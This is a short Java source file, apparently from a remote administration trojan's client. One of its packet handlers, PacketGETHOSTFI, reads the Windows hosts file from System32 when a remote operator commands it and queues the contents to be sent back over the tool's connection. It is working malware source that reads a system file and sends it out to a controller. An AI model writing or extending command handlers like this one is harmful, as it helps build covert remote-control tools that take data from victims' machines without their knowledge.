package com.redpois0n.packets.incoming;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.common.OperatingSystem;
import com.redpois0n.packets.outgoing.Header;


public class PacketGETHOSTFI extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts")));
			String tosend = "";
			
			String line;
			
			while ((line = reader.readLine()) != null) {
				tosend += line + "\n";
			}
			Connection.addToSendQueue(new PacketBuilder(Header.HOST_FILE, tosend));
			reader.close();
		}
	}

}
